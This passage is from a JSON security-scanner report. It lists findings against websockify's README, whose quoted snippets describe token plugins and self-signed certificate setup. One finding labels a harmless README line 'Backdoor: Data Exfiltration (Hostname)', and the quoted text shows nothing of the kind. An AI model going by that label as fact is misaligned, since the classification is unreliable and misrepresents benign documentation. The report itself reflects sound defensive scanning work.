                    "text": "\n* Token plugins: a single instance of websockify can connect clients to\n  multiple different pre-configured targets, depending on the token sent\n  by the client using the `token` URL parameter, or the hostname used to\n  reach websockify, if you use `--host-token`. This functionality is\n  activated with the `--token-plugin CLASS` and `--token-source ARG`\n  options, where CLASS is usually one from token_plugins.py and ARG is\n",
                    "rendered": {
                      "text": "\n* Token plugins: a single instance of websockify can connect clients to\n  multiple different pre-configured targets, depending on the token sent\n  by the client using the `token` URL parameter, or the hostname used to\n  reach websockify, if you use `--host-token`. This functionality is\n  activated with the `--token-plugin CLASS` and `--token-source ARG`\n  options, where CLASS is usually one from token_plugins.py and ARG is\n",
                      "markdown": "`\n* Token plugins: a single instance of websockify can connect clients to\n  multiple different pre-configured targets, depending on the token sent\n  by the client using the `token` URL parameter, or the hostname used to\n  reach websockify, if you use `--host-token`. This functionality is\n  activated with the `--token-plugin CLASS` and `--token-source ARG`\n  options, where CLASS is usually one from token_plugins.py and ARG is\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/README.md"
                },
                "region": {
                  "startLine": 46,
                  "startColumn": 55,
                  "endLine": 46,
                  "endColumn": 63,
                  "snippet": {
                    "text": "generate a certificate and key for Websockify to load. By default, Websockify\nloads a certificate file name `self.pem` but the `--cert=CERT` and `--key=KEY`\noptions can override the file name. You can generate a self-signed certificate\nusing openssl. When asked for the common name, use the hostname of the server\nwhere the proxy will be running:\n\n```\n",
                    "rendered": {
                      "text": "generate a certificate and key for Websockify to load. By default, Websockify\nloads a certificate file name `self.pem` but the `--cert=CERT` and `--key=KEY`\noptions can override the file name. You can generate a self-signed certificate\nusing openssl. When asked for the common name, use the hostname of the server\nwhere the proxy will be running:\n\n```\n",
                      "markdown": "`generate a certificate and key for Websockify to load. By default, Websockify\nloads a certificate file name `self.pem` but the `--cert=CERT` and `--key=KEY`\noptions can override the file name. You can generate a self-signed certificate\nusing openssl. When asked for the common name, use the hostname of the server\nwhere the proxy will be running:\n\n```\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        }
      ],
      "columnKind": "utf16CodeUnits"
    }
  ]
}